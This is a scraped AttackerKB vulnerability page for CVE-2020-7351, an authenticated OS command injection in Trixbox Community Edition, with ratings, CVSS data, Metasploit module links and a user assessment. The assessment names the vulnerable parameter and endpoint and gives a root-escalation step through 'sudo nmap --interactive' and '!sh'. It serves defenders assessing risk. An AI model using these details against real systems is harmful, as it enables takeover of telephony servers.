=== Content from attackerkb.com_f51f5749_20250119_132524.html ===


[![](/static/public/img/logo-condensed-dark.png)
![](/static/public/img/logo-dark.png)
A Rapid7 Project](/)

* [Activity Feed](/activity-feed)
* [Topics](/topics)
* [About](/about)
* [Leaderboard](/leaderboard)

[Log In](/login)

![](/static/private/img/attacker-value/dark/attacker-value-3.svg)

Attacker Value
##### Moderate

1

### CVE-2020-7351

1

## CVE ID

AttackerKB requires a CVE ID in order to pull vulnerability data and references from the [CVE list](https://cve.mitre.org)
and the [National Vulnerability Database](https://nvd.nist.gov). If available, please supply below:

CVE ID:

## Add References:

##### Advisory

Description:
URL:

Add Another

##### Exploit

Description:
URL:

Add Another

##### Mitigation

Description:
URL:

Add Another

##### Related AttackerKB Topic

Description:
URL:

Add Another

##### Government or Industry Alert

Description:
URL:

Add Another

##### Miscellaneous

Description:
URL:

Add Another

Cancel
Submit

![](/static/private/img/attacker-value/dark/attacker-value-3.svg)

Attacker Value
###### Moderate

(1 user assessed)

![](/static/private/img/attacker-value/dark/attacker-value-5.svg)

Exploitability
###### Very High

(1 user assessed)

User Interaction
###### [None](/search?userInteraction=NONE)

Privileges Required
###### [Low](/search?privilegesRequired=LOW)

Attack Vector
###### [Network](/search?attackVector=NETWORK)

1

# CVE-2020-7351

Disclosure Date: April 28, 2020
•
(Last updated November 27, 2024) ▾

[CVE-2020-7351](/search?q=CVE-2020-7351)
CVSS v3 Base Score:
8.8

Report As Exploited in the Wild

MITRE ATT&CK[Log in to add MITRE ATT&CK tag](/login)
Add MITRE ATT&CK tactics and techniques that apply to this CVE.
Initial Access
Techniques

Validation

Exploit Public-Facing Application

Validated

### MITRE ATT&CK

Select the MITRE ATT&CK Tactics that apply to this CVE

Initial AccessExecutionPersistencePrivilege EscalationDefense EvasionCredential AccessDiscoveryLateral MovementCollectionExfiltrationCommand and ControlImpact

##### Collection

Select any Techniques used:

Data from Local System

Data from Removable Media

Data from Network Shared Drive

Input Capture

Input Capture: Keylogging

Input Capture: GUI Input Capture

Input Capture: Web Portal Capture

Input Capture: Credential API Hooking

Data Staged

Data Staged: Local Data Staging

Data Staged: Remote Data Staging

Screen Capture

Email Collection

Email Collection: Local Email Collection

Email Collection: Remote Email Collection

Email Collection: Email Forwarding Rule

Clipboard Data

Automated Collection

Audio Capture

Video Capture

Man in the Browser

Data from Information Repositories

Data from Information Repositories: Confluence

Data from Information Repositories: Sharepoint

Data from Cloud Storage Object

Man-in-the-Middle

Man-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

Archive Collected Data

Archive Collected Data: Archive via Utility

Archive Collected Data: Archive via Library

Archive Collected Data: Archive via Custom Method

##### Command and Control

Select any Techniques used:

Data Obfuscation

Data Obfuscation: Junk Data

Data Obfuscation: Steganography

Data Obfuscation: Protocol Impersonation

Fallback Channels

Application Layer Protocol

Application Layer Protocol: Web Protocols

Application Layer Protocol: File Transfer Protocols

Application Layer Protocol: Mail Protocols

Application Layer Protocol: DNS

Proxy

Proxy: Internal Proxy

Proxy: External Proxy

Proxy: Multi-hop Proxy

Proxy: Domain Fronting

Communication Through Removable Media

Non-Application Layer Protocol

Web Service

Web Service: Dead Drop Resolver

Web Service: Bidirectional Communication

Web Service: One-Way Communication

Multi-Stage Channels

Ingress Tool Transfer

Data Encoding

Data Encoding: Standard Encoding

Data Encoding: Non-Standard Encoding

Traffic Signaling

Traffic Signaling: Port Knocking

Remote Access Software

Dynamic Resolution

Dynamic Resolution: Fast Flux DNS

Dynamic Resolution: Domain Generation Algorithms

Dynamic Resolution: DNS Calculation

Non-Standard Port

Protocol Tunneling

Encrypted Channel

Encrypted Channel: Symmetric Cryptography

Encrypted Channel: Asymmetric Cryptography

##### Credential Access

Select any Techniques used:

OS Credential Dumping

OS Credential Dumping: LSASS Memory

OS Credential Dumping: Security Account Manager

OS Credential Dumping: NTDS

OS Credential Dumping: LSA Secrets

OS Credential Dumping: Cached Domain Credentials

OS Credential Dumping: DCSync

OS Credential Dumping: Proc Filesystem

OS Credential Dumping: /etc/passwd and /etc/shadow

Network Sniffing

Input Capture

Input Capture: Keylogging

Input Capture: GUI Input Capture

Input Capture: Web Portal Capture

Input Capture: Credential API Hooking

Brute Force

Brute Force: Password Guessing

Brute Force: Password Cracking

Brute Force: Password Spraying

Brute Force: Credential Stuffing

Two-Factor Authentication Interception

Forced Authentication

Exploitation for Credential Access

Steal Application Access Token

Steal Web Session Cookie

Unsecured Credentials

Unsecured Credentials: Credentials In Files

Unsecured Credentials: Credentials in Registry

Unsecured Credentials: Bash History

Unsecured Credentials: Private Keys

Unsecured Credentials: Cloud Instance Metadata API

Unsecured Credentials: Group Policy Preferences

Credentials from Password Stores

Credentials from Password Stores: Keychain

Credentials from Password Stores: Securityd Memory

Credentials from Password Stores: Credentials from Web Browsers

Modify Authentication Process

Modify Authentication Process: Domain Controller Authentication

Modify Authentication Process: Password Filter DLL

Modify Authentication Process: Pluggable Authentication Modules

Man-in-the-Middle

Man-in-the-Middle: LLMNR/NBT-NS Poisoning and SMB Relay

Steal or Forge Kerberos Tickets

Steal or Forge Kerberos Tickets: Golden Ticket

Steal or Forge Kerberos Tickets: Silver Ticket

Steal or Forge Kerberos Tickets: Kerberoasting

##### Defense Evasion

Select any Techniques used:

Direct Volume Access

Rootkit

Obfuscated Files or Information

Obfuscated Files or Information: Binary Padding

Obfuscated Files or Information: Software Packing

Obfuscated Files or Information: Steganography

Obfuscated Files or Information: Compile After Delivery

Obfuscated Files or Information: Indicator Removal from Tools

Masquerading

Masquerading: Invalid Code Signature

Masquerading: Right-to-Left Override

Masquerading: Rename System Utilities

Masquerading: Masquerade Task or Service

Masquerading: Match Legitimate Name or Location

Masquerading: Space after Filename

Process Injection

Process Injection: Dynamic-link Library Injection

Process Injection: Portable Executable Injection

Process Injection: Thread Execution Hijacking

Process Injection: Asynchronous Procedure Call

Process Injection: Thread Local Storage

Process Injection: Ptrace System Calls

Process Injection: Proc Memory

Process Injection: Extra Window Memory Injection

Process Injection: Process Hollowing

Process Injection: Process Doppelgänging

Process Injection: VDSO Hijacking

Indicator Removal on Host

Indicator Removal on Host: Clear Windows Event Logs

Indicator Removal on Host: Clear Linux or Mac System Logs

Indicator Removal on Host: Clear Command History

Indicator Removal on Host: File Deletion

Indicator Removal on Host: Network Share Connection Removal

Indicator Removal on Host: Timestomp

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Modify Registry

Trusted Developer Utilities Proxy Execution

Trusted Developer Utilities Proxy Execution: MSBuild

Access Token Manipulation

Access Token Manipulation: Token Impersonation/Theft

Access Token Manipulation: Create Process with Token

Access Token Manipulation: Make and Impersonate Token

Access Token Manipulation: Parent PID Spoofing

Access Token Manipulation: SID-History Injection

Deobfuscate/Decode Files or Information

BITS Jobs

Indirect Command Execution

Traffic Signaling

Traffic Signaling: Port Knocking

Rogue Domain Controller

Exploitation for Defense Evasion

Signed Script Proxy Execution

Signed Script Proxy Execution: PubPrn

Signed Binary Proxy Execution

Signed Binary Proxy Execution: Compiled HTML File

Signed Binary Proxy Execution: Control Panel

Signed Binary Proxy Execution: CMSTP

Signed Binary Proxy Execution: InstallUtil

Signed Binary Proxy Execution: Mshta

Signed Binary Proxy Execution: Msiexec

Signed Binary Proxy Execution: Odbcconf

Signed Binary Proxy Execution: Regsvcs/Regasm

Signed Binary Proxy Execution: Regsvr32

Signed Binary Proxy Execution: Rundll32

XSL Script Processing

Template Injection

File and Directory Permissions Modification

File and Directory Permissions Modification: Windows File and Directory Permissions Modification

File and Directory Permissions Modification: Linux and Mac File and Directory Permissions Modification

Execution Guardrails

Execution Guardrails: Environmental Keying

Group Policy Modification

Virtualization/Sandbox Evasion

Virtualization/Sandbox Evasion: System Checks

Virtualization/Sandbox Evasion: User Activity Based Checks

Virtualization/Sandbox Evasion: Time Based Evasion

Unused/Unsupported Cloud Regions

Pre-OS Boot

Pre-OS Boot: System Firmware

Pre-OS Boot: Component Firmware

Pre-OS Boot: Bootkit

Abuse Elevation Control Mechanism

Abuse Elevation Control Mechanism: Setuid and Setgid

Abuse Elevation Control Mechanism: Bypass User Access Control

Abuse Elevation Control Mechanism: Sudo and Sudo Caching

Abuse Elevation Control Mechanism: Elevated Execution with Prompt

Use Alternate Authentication Material

Use Alternate Authentication Material: Application Access Token

Use Alternate Authentication Material: Pass the Hash

Use Alternate Authentication Material: Pass the Ticket

Use Alternate Authentication Material: Web Session Cookie

Subvert Trust Controls

Subvert Trust Controls: Gatekeeper Bypass

Subvert Trust Controls: Code Signing

Subvert Trust Controls: SIP and Trust Provider Hijacking

Subvert Trust Controls: Install Root Certificate

Modify Authentication Process

Modify Authentication Process: Domain Controller Authentication

Modify Authentication Process: Password Filter DLL

Modify Authentication Process: Pluggable Authentication Modules

Impair Defenses

Impair Defenses: Disable or Modify Tools

Impair Defenses: Disable Windows Event Logging

Impair Defenses: HISTCONTROL

Impair Defenses: Disable or Modify System Firewall

Impair Defenses: Indicator Blocking

Impair Defenses: Disable or Modify Cloud Firewall

Hide Artifacts

Hide Artifacts: Hidden Files and Directories

Hide Artifacts: Hidden Users

Hide Artifacts: Hidden Window

Hide Artifacts: NTFS File Attributes

Hide Artifacts: Hidden File System

Hide Artifacts: Run Virtual Instance

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

Modify Cloud Compute Infrastructure

Modify Cloud Compute Infrastructure: Create Snapshot

Modify Cloud Compute Infrastructure: Create Cloud Instance

Modify Cloud Compute Infrastructure: Delete Cloud Instance

Modify Cloud Compute Infrastructure: Revert Cloud Instance

##### Discovery

Select any Techniques used:

System Service Discovery

Application Window Discovery

Query Registry

System Network Configuration Discovery

Remote System Discovery

System Owner/User Discovery

Network Sniffing

Network Service Scanning

System Network Connections Discovery

Process Discovery

Permission Groups Discovery

Permission Groups Discovery: Local Groups

Permission Groups Discovery: Domain Groups

Permission Groups Discovery: Cloud Groups

System Information Discovery

File and Directory Discovery

Account Discovery

Account Discovery: Local Account

Account Discovery: Domain Account

Account Discovery: Email Account

Account Discovery: Cloud Account

Peripheral Device Discovery

System Time Discovery

Network Share Discovery

Password Policy Discovery

Browser Bookmark Discovery

Domain Trust Discovery

Virtualization/Sandbox Evasion

Virtualization/Sandbox Evasion: System Checks

Virtualization/Sandbox Evasion: User Activity Based Checks

Virtualization/Sandbox Evasion: Time Based Evasion

Software Discovery

Software Discovery: Security Software Discovery

Cloud Service Discovery

Cloud Service Dashboard

##### Execution

Select any Techniques used:

Windows Management Instrumentation

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Command and Scripting Interpreter

Command and Scripting Interpreter: PowerShell

Command and Scripting Interpreter: AppleScript

Command and Scripting Interpreter: Windows Command Shell

Command and Scripting Interpreter: Unix Shell

Command and Scripting Interpreter: Visual Basic

Command and Scripting Interpreter: Python

Command and Scripting Interpreter: JavaScript/JScript

Software Deployment Tools

Native API

Shared Modules

Exploitation for Client Execution

User Execution

User Execution: Malicious Link

User Execution: Malicious File

Inter-Process Communication

Inter-Process Communication: Component Object Model

Inter-Process Communication: Dynamic Data Exchange

System Services

System Services: Launchctl

System Services: Service Execution

##### Exfiltration

Select any Techniques used:

Exfiltration Over Other Network Medium

Exfiltration Over Other Network Medium: Exfiltration Over Bluetooth

Automated Exfiltration

Scheduled Transfer

Data Transfer Size Limits

Exfiltration Over C2 Channel

Exfiltration Over Alternative Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Symmetric Encrypted Non-C2 Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol

Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol

Exfiltration Over Physical Medium

Exfiltration Over Physical Medium: Exfiltration over USB

Transfer Data to Cloud Account

Exfiltration Over Web Service

Exfiltration Over Web Service: Exfiltration to Code Repository

Exfiltration Over Web Service: Exfiltration to Cloud Storage

##### Impact

Select any Techniques used:

Data Destruction

Data Encrypted for Impact

Service Stop

Inhibit System Recovery

Defacement

Defacement: Internal Defacement

Defacement: External Defacement

Firmware Corruption

Resource Hijacking

Network Denial of Service

Network Denial of Service: Direct Network Flood

Network Denial of Service: Reflection Amplification

Endpoint Denial of Service

Endpoint Denial of Service: OS Exhaustion Flood

Endpoint Denial of Service: Service Exhaustion Flood

Endpoint Denial of Service: Application Exhaustion Flood

Endpoint Denial of Service: Application or System Exploitation

System Shutdown/Reboot

Account Access Removal

Disk Wipe

Disk Wipe: Disk Content Wipe

Disk Wipe: Disk Structure Wipe

Data Manipulation

Data Manipulation: Stored Data Manipulation

Data Manipulation: Transmitted Data Manipulation

Data Manipulation: Runtime Data Manipulation

##### Initial Access

Select any Techniques used:

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Replication Through Removable Media

External Remote Services

Drive-by Compromise

Exploit Public-Facing Application

Supply Chain Compromise

Supply Chain Compromise: Compromise Software Dependencies and Development Tools

Supply Chain Compromise: Compromise Software Supply Chain

Supply Chain Compromise: Compromise Hardware Supply Chain

Trusted Relationship

Hardware Additions

Phishing

Phishing: Spearphishing Attachment

Phishing: Spearphishing Link

Phishing: Spearphishing via Service

##### Lateral Movement

Select any Techniques used:

Remote Services

Remote Services: Remote Desktop Protocol

Remote Services: SMB/Windows Admin Shares

Remote Services: Distributed Component Object Model

Remote Services: SSH

Remote Services: VNC

Remote Services: Windows Remote Management

Software Deployment Tools

Taint Shared Content

Replication Through Removable Media

Exploitation of Remote Services

Internal Spearphishing

Use Alternate Authentication Material

Use Alternate Authentication Material: Application Access Token

Use Alternate Authentication Material: Pass the Hash

Use Alternate Authentication Material: Pass the Ticket

Use Alternate Authentication Material: Web Session Cookie

Remote Service Session Hijacking

Remote Service Session Hijacking: SSH Hijacking

Remote Service Session Hijacking: RDP Hijacking

Lateral Tool Transfer

##### Persistence

Select any Techniques used:

Boot or Logon Initialization Scripts

Boot or Logon Initialization Scripts: Logon Script (Windows)

Boot or Logon Initialization Scripts: Logon Script (Mac)

Boot or Logon Initialization Scripts: Network Logon Script

Boot or Logon Initialization Scripts: Rc.common

Boot or Logon Initialization Scripts: Startup Items

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Account Manipulation

Account Manipulation: Additional Azure Service Principal Credentials

Account Manipulation: Exchange Email Delegate Permissions

Account Manipulation: Add Office 365 Global Administrator Role

Account Manipulation: SSH Authorized Keys

External Remote Services

Create Account

Create Account: Local Account

Create Account: Domain Account

Create Account: Cloud Account

Office Application Startup

Office Application Startup: Office Template Macros

Office Application Startup: Office Test

Office Application Startup: Outlook Forms

Office Application Startup: Outlook Home Page

Office Application Startup: Outlook Rules

Office Application Startup: Add-ins

Browser Extensions

BITS Jobs

Traffic Signaling

Traffic Signaling: Port Knocking

Server Software Component

Server Software Component: SQL Stored Procedures

Server Software Component: Transport Agent

Server Software Component: Web Shell

Implant Container Image

Pre-OS Boot

Pre-OS Boot: System Firmware

Pre-OS Boot: Component Firmware

Pre-OS Boot: Bootkit

Create or Modify System Process

Create or Modify System Process: Launch Agent

Create or Modify System Process: Systemd Service

Create or Modify System Process: Windows Service

Create or Modify System Process: Launch Daemon

Event Triggered Execution

Event Triggered Execution: Change Default File Association

Event Triggered Execution: Screensaver

Event Triggered Execution: Windows Management Instrumentation Event Subscription

Event Triggered Execution: .bash\_profile and .bashrc

Event Triggered Execution: Trap

Event Triggered Execution: LC\_LOAD\_DYLIB Addition

Event Triggered Execution: Netsh Helper DLL

Event Triggered Execution: Accessibility Features

Event Triggered Execution: AppCert DLLs

Event Triggered Execution: AppInit DLLs

Event Triggered Execution: Application Shimming

Event Triggered Execution: Image File Execution Options Injection

Event Triggered Execution: PowerShell Profile

Event Triggered Execution: Emond

Event Triggered Execution: Component Object Model Hijacking

Boot or Logon Autostart Execution

Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

Boot or Logon Autostart Execution: Authentication Package

Boot or Logon Autostart Execution: Time Providers

Boot or Logon Autostart Execution: Winlogon Helper DLL

Boot or Logon Autostart Execution: Security Support Provider

Boot or Logon Autostart Execution: Kernel Modules and Extensions

Boot or Logon Autostart Execution: Re-opened Applications

Boot or Logon Autostart Execution: LSASS Driver

Boot or Logon Autostart Execution: Shortcut Modification

Boot or Logon Autostart Execution: Port Monitors

Boot or Logon Autostart Execution: Plist Modification

Compromise Client Software Binary

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

##### Privilege Escalation

Select any Techniques used:

Boot or Logon Initialization Scripts

Boot or Logon Initialization Scripts: Logon Script (Windows)

Boot or Logon Initialization Scripts: Logon Script (Mac)

Boot or Logon Initialization Scripts: Network Logon Script

Boot or Logon Initialization Scripts: Rc.common

Boot or Logon Initialization Scripts: Startup Items

Scheduled Task/Job

Scheduled Task/Job: At (Linux)

Scheduled Task/Job: At (Windows)

Scheduled Task/Job: Cron

Scheduled Task/Job: Launchd

Scheduled Task/Job: Scheduled Task

Process Injection

Process Injection: Dynamic-link Library Injection

Process Injection: Portable Executable Injection

Process Injection: Thread Execution Hijacking

Process Injection: Asynchronous Procedure Call

Process Injection: Thread Local Storage

Process Injection: Ptrace System Calls

Process Injection: Proc Memory

Process Injection: Extra Window Memory Injection

Process Injection: Process Hollowing

Process Injection: Process Doppelgänging

Process Injection: VDSO Hijacking

Exploitation for Privilege Escalation

Valid Accounts

Valid Accounts: Default Accounts

Valid Accounts: Domain Accounts

Valid Accounts: Local Accounts

Valid Accounts: Cloud Accounts

Access Token Manipulation

Access Token Manipulation: Token Impersonation/Theft

Access Token Manipulation: Create Process with Token

Access Token Manipulation: Make and Impersonate Token

Access Token Manipulation: Parent PID Spoofing

Access Token Manipulation: SID-History Injection

Group Policy Modification

Create or Modify System Process

Create or Modify System Process: Launch Agent

Create or Modify System Process: Systemd Service

Create or Modify System Process: Windows Service

Create or Modify System Process: Launch Daemon

Event Triggered Execution

Event Triggered Execution: Change Default File Association

Event Triggered Execution: Screensaver

Event Triggered Execution: Windows Management Instrumentation Event Subscription

Event Triggered Execution: .bash\_profile and .bashrc

Event Triggered Execution: Trap

Event Triggered Execution: LC\_LOAD\_DYLIB Addition

Event Triggered Execution: Netsh Helper DLL

Event Triggered Execution: Accessibility Features

Event Triggered Execution: AppCert DLLs

Event Triggered Execution: AppInit DLLs

Event Triggered Execution: Application Shimming

Event Triggered Execution: Image File Execution Options Injection

Event Triggered Execution: PowerShell Profile

Event Triggered Execution: Emond

Event Triggered Execution: Component Object Model Hijacking

Boot or Logon Autostart Execution

Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

Boot or Logon Autostart Execution: Authentication Package

Boot or Logon Autostart Execution: Time Providers

Boot or Logon Autostart Execution: Winlogon Helper DLL

Boot or Logon Autostart Execution: Security Support Provider

Boot or Logon Autostart Execution: Kernel Modules and Extensions

Boot or Logon Autostart Execution: Re-opened Applications

Boot or Logon Autostart Execution: LSASS Driver

Boot or Logon Autostart Execution: Shortcut Modification

Boot or Logon Autostart Execution: Port Monitors

Boot or Logon Autostart Execution: Plist Modification

Abuse Elevation Control Mechanism

Abuse Elevation Control Mechanism: Setuid and Setgid

Abuse Elevation Control Mechanism: Bypass User Access Control

Abuse Elevation Control Mechanism: Sudo and Sudo Caching

Abuse Elevation Control Mechanism: Elevated Execution with Prompt

Hijack Execution Flow

Hijack Execution Flow: DLL Search Order Hijacking

Hijack Execution Flow: DLL Side-Loading

Hijack Execution Flow: Dylib Hijacking

Hijack Execution Flow: Executable Installer File Permissions Weakness

Hijack Execution Flow: LD\_PRELOAD

Hijack Execution Flow: Path Interception by PATH Environment Variable

Hijack Execution Flow: Path Interception by Search Order Hijacking

Hijack Execution Flow: Path Interception by Unquoted Path

Hijack Execution Flow: Services File Permissions Weakness

Hijack Execution Flow: Services Registry Permissions Weakness

Hijack Execution Flow: COR\_PROFILER

Submit

Metasploit Module

[TrixBox CE endpoint\_devicemap.php Authenticated Command Execution](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/trixbox_ce_endpoint_devicemap_rce.rb "TrixBox CE endpoint_devicemap.php Authenticated Command Execution")

[Easy to weaponize](/search?q=easy_to_develop&qt=tag)[Vulnerable in default configuration](/search?q=default_configuration&qt=tag)[Authenticated](/search?q=post_auth&qt=tag)

### Topic Tags

Select the tags that apply to this CVE (Assessment added tags are disabled and cannot be removed)

What makes this of high-value to an attacker?

Vulnerable in default configuration

Unauthenticated

Observed in state-sponsored attacks

Observed in ransomware attacks

Gives privileged access

Easy to weaponize

Difficult to patch

Common in enterprise

CISA KEV Listed

What makes this of low-value to an attacker?

Vulnerable in uncommon configuration

Requires user interaction

Requires physical access

Requires elevated access

No useful access

Difficult to weaponize

Authenticated

Submit

## Description

An OS Command Injection vulnerability in the endpoint\_devicemap.php component of Fonality Trixbox Community Edition allows an attacker to execute commands on the underlying operating system as the “asterisk” user. Note that Trixbox Community Edition has been unsupported by the vendor since 2012. This issue affects: Fonality Trixbox Community Edition, versions 1.2.0 through 2.8.0.4. Versions 1.0 and 1.1 are unaffected.

[See More
See Less](#description)

* [Ratings & Analysis](#ratings-analysis)
* [Vulnerability Details](#vuln-details)

## Add Assessment

[Log in to add an Assessment](/login)

2

[![](https://avatars.githubusercontent.com/u/63261883?v=4&s=50)](/contributors/gwillcox-r7)

**[gwillcox-r7 (579)](/contributors/gwillcox-r7)**
![](/static/public/img/Badges-100-assessments.svg)

![](/static/public/img/Badges-1st-Place.svg)

[November 25, 2020 6:12pm UTC (4 years ago)](/assessments/46dce446-06f2-4919-b2fe-6f72b01933f7)•Edited 4 years ago

###### Ratings

* Attacker Value
  Medium
* Exploitability
  Very High
[Easy to weaponize](/search?q=easy_to_develop&qt=tag)[Vulnerable in default configuration](/search?q=default_configuration&qt=tag)[Authenticated](/search?q=post_auth&qt=tag)
###### Technical Analysis

A command injection vulnerability in the `network` POST parameter of the `/maint/modules/endpointcfg/endpoint_devicemap.php` page on Fonality Trixbox Community Edition versions 1.2.0 through 2.8.0.4 allowed remote authenticated attackers to take complete control over the affected devices as the `asterisk` user, and then elevate to `root` by running `sudo nmap --interactive` followed by `!sh` from within `nmap`.

My personal opinion on this is that it is a very wide ranging vulnerability in terms of the number of versions affected. We are talking over 60% of the released versions of Fonality Trixbox Community Edition were affected by this vulnerability, although the main downside is that Fonality TrixBox Community Edition is no longer supported by its developers.

This creates an interesting question cause whilst telephony systems are known to run out of date and depreciated software (as is the case with many public service departments), I don’t know if this particular software would still be used in most departments or if they would have just moved on by this point. Particularly given that this software is the community edition I imagine most users would have moved on to other software by now, but we all know that, like Windows XP, some people will still cling to what they know is tried and true. That being said I would have to imagine that the numbers have diminished significantly in the time between the last release of Fonality TrixBox Community Edition and now.

Additionally the requirement for a user to be authenticated to exploit this vulnerability means that simply setting a strong password on affected devices will likely prevent them from being compromised by this vulnerability.

TLDR: An interesting vulnerability but seeing as the software is no longer supported and it does require authenticated access, its probably not something that should be at the top of your priority list unless you know you are running TrixBox Community Edition, in which case if you can’t upgrade it is recommended you ensure all devices have a strong password, as this will prevent users from easily being able to exploit this vulnerability.

#### Would you also like to delete your Exploited in the Wild Report?

[Delete Assessment Only](/assessments/46dce446-06f2-4919-b2fe-6f72b01933f7)
[Delete Assessment and Exploited in the Wild Report](/assessments/46dce446-06f2-4919-b2fe-6f72b01933f7)

[Log in to Add Reply](/login)

[See MoreSee Less](#analysis-46dce446-06f2-4919-b2fe-6f72b01933f7)

##### CVSS V3 Severity and Metrics

Data provided by the [National Vulnerability Database (NVD)](https://nvd.nist.gov/)
Base Score:

8.8 High

Impact Score:

5.9

Exploitability Score:

2.8

Vector:

CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

Attack Vector (AV):

Network

Attack Complexity (AC):

Low

Privileges Required (PR):

Low

User Interaction (UI):

None

Scope (S):

Unchanged

Confidentiality (C):

High

Integrity (I):

High

Availability (A):

High

### General Information

Offensive Application
Unknown
Utility Class
Unknown
Ports

Unknown

OS

Unknown

Vulnerable Versions
Trixbox Community Edition 2.8.0.4
Trixbox Community Edition 1.0
Trixbox Community Edition 1.1
Prerequisites

Unknown

Discovered By

Unknown

PoC Author

Unknown

Metasploit Module
exploit/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce
Reporter

Unknown

### Vendors

* netfortris

### Products

* trixbox

### Metasploit Modules

[TrixBox CE endpoint\_devicemap.php Authenticated Command Execution (https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb)](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/trixbox_ce_endpoint_devicemap_rce.rb)

### References

##### Canonical

[CVE-2020-7351 (https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7351)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-7351)
##### Miscellaneous

<https://github.com/rapid7/metasploit-framework/pull/13353><http://packetstormsecurity.com/files/157565/TrixBox-CE-2.8.0.4-Command-Execution.html>

### Additional Info

Authenticated

Unknown
Exploitable

Unknown
Reliability

Unknown
Stability

Unknown
Available Mitigations

Unknown
Shelf Life

Unknown
Userbase/Installbase

Unknown
Patch Effectiveness

Unknown

![](/static/public/img/rapid7-avatar.svg)

Rapid7

###### Technical Analysis

# Report as Emergent Threat Response

Please provide the link to the ETR blog if available.

Add a reference URL (optional):

Report as ETR
Update Report

# Report as Exploited in the Wild

AttackerKB users want to know this is information they can trust.

Help the community by indicating the source(s) of your knowledge:

* Vendor Advisory

  Add a reference URL
  (required):

  Please provide a link to the Vendor Advisory.
* Government or Industry Alert

  Add a reference URL
  (required):

  Please provide a link to the Government or Industry Alert.
* Threat Feed

  Add a reference URL
  (required):

  Please provide a link to the Threat Feed.
* News Article or Blog

  Add a reference URL
  (required):

  Please provide a link to the News Reference.
* Exploitation personally observed in an environment (client, customer, employer, or personal environment)

  Add a reference URL
  (required):

  Please provide a link or [create an assessment](/topics/0VW2u2Lb4E/cve-2020-7351/assess) as evidence to support your personal observation claim.
* Other:

  Please explain the source of your report.

  Add a reference URL
  (required):

  Please provide a link or [create an assessment](/topics/0VW2u2Lb4E/cve-2020-7351/assess) as evidence of the source of your report.

Report and add more details
Report as Exploited
Update Report

## CVE ID

AttackerKB requires a CVE ID in order to pull vulnerability data and references from the [CVE list](https://cve.mitre.org)
and the [National Vulnerability Database](https://nvd.nist.gov). If available, please supply below:

CVE ID:

## Add References:

Cancel
Submit

![](/static/public/img/close-white.svg)
## Quick Cookie Notification

This site uses cookies for anonymized analytics to improve the site.

Rapid7 will never sell the data collected on this site.

I AGREE, LET’S GO!

---

View our [Cookie Policy](https://www.rapid7.com/privacy-policy/tracking-technologies/) for full details

This site uses cookies for anonymized analytics. For more information or to change your cookie settings, view our [Cookie Policy](https://www.rapid7.com/privacy-policy/tracking-technologies/).

![](/static/public/img/close-white.svg)

[Terms of Use](/terms)
[Code of Conduct](/codeofconduct)
[FAQ](/faq)
[Changelog](/changelog)
[Privacy Policy](https://rapid7.com/privacy-policy)
Contact
[API](https://api.attackerkb.com/v1/api-docs/docs)
[A Rapid7 Project](https://www.rapid7.com)

[![](/static/public/img/logo-condensed-dark.png)](/)



=== Content from github.com_90d2d2d2_20250119_113604.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Frapid7%2Fmetasploit-framework%2Fpull%2F13353)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
